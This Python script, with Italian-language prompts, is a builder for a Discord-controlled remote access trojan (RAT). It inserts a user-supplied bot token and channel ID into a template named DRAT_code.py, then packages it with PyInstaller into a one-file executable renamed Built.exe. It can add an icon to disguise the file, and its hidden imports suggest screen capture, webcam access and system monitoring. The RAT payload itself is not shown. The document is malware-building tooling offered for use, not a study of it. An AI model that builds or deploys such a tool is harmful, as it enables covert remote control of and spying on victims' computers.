import subprocess
import os
import shutil
import sys
import time
from colorama import *
import discord
import asyncio

print (Fore.RED + """                                                                                                                                                          
#                                                                                                   
 ##                                                                                               # 
   ##                                                                                           ##  
    ####                                                                                     ####   
      #####                                                                               #####     
        ######                                                                        *######       
          ########                                                                 ########         
            .#########                                                        (#########            
               ############                                               ############              
                  ##############                                     ##############                 
                     ################                           ################                    
                        #################.                 .#################                       
                           #################             #################                          
                              ##############             ##############                             
                                 ##########               #########,                                
                                   ########               ########                                  
                                  (#######                ########                                  
                                  #########               #########                                 
                                  ###########           ###########                                 
                                 ################  .###############                                 
                                   ###############################                                  
                                      #########################                                     
                                         ###################                                        
                                            #############                                           
                                               #######                                                               
""")



async def validator(tk):
    intents = discord.Intents.all()
    intents.message_content = True
    client = discord.Client(intents=intents)
    print(Fore.YELLOW + "Checking if the token is valid...")
    try:
        await client.login(tk)
        isvalid = True
        await client.close()
    except discord.errors.LoginFailure:
        isvalid = False
    return isvalid

Identificatore = input(Fore.GREEN + "Inserisci l'ID del canale dove il RAT manderà i messaggi: ")
tokenbot = input(Fore.GREEN + "Inserisci il token del bot: ")
boh = asyncio.run(validator(tokenbot))
if boh == True:
    print(f"{tokenbot} è un token valido!")
    ico = input(f"Inserire un'icona al file? ({Fore.GREEN + 'Y'}/{Fore.RED + 'N'}):")
    if str(ico) == "Y":
        ico = True
        print(ico)
        setico = input(Fore.GREEN + "Percorso icona: ")
    elif str(ico) == "N":
        ico = False
        print(ico)
    vero = os.path.dirname(sys.argv[0])
    os.chdir(vero)

    def read(file):
        f = open(file , "r")
        data = f.read()
        f.close()
        return data

    def write(file , contenuto):
        f = open(file , "w")
        f.write(contenuto) 
        f.close()

    print(vero)
    try:
        data = read("DRAT_code.py")
        rimpiazzoI = data.replace("%TOKEN%" , tokenbot).replace("%ID%" , Identificatore)
        write("DRAT_code.py" , rimpiazzoI)
        time.sleep(3.0)
    except:
        print ("Something went wrong in the building of the file")
    os.chdir(vero)
    try:
        os.makedirs(name="RAT_result")
    except FileExistsError:
        pass
    destinazione = os.path.join(vero , "RAT_result")
    try:
        comando1 = "pip install pyinstaller"
        subprocess.call(comando1 , shell=True)
    except:
        print("Procedo")
    try:
        os.chdir(vero)
        os.remove("DRAT_code.spec")
        time.sleep(5.0)
        for file in os.listdir(f"{vero}\\RAT_result"):
            os.remove(os.path.join(f"{vero}\\RAT_result" , file))
        for file in os.listdir(f"{vero}\\build"):
            shutil.rmtree (f"{vero}\\build")
    except FileExistsError:
        print("File doesn't exist, proceeding")
    except:
        print("Proceeding")
    comando2 = f'pyinstaller "{vero}\\DRAT_code.py" --hidden-import discord --hidden-import pyautogui --hidden-import requests --hidden-import wmi --hidden-import cv2 --hidden-import platform --hidden-import ctypes --hidden-import psutil -i "NONE" --onefile --distpath "{destinazione}"'
    if ico == True:
        comando2 = f'{comando2} -i "{setico}"'
    subprocess.call(comando2, shell=True)
    os.chdir(f"{vero}\\RAT_result")
    os.rename("DRAT_code.exe" , "Built.exe")
    os.chdir(vero)
    data = read("DRAT_code.py")
    rimpiazzoF = data.replace(tokenbot , "%TOKEN%").replace(Identificatore , "%ID%")
    write("DRAT_code.py" , rimpiazzoF)
    os.startfile (os.path.join(vero , "RAT_result"))
    if ico == True:
        print(Fore.RED + "WARNING! If you built a .exe file without icon before, the file might not appear with the selected icon in the folder. But will appear in every other folder")
elif boh == False:
    print(f"{tokenbot} is not a valid token")

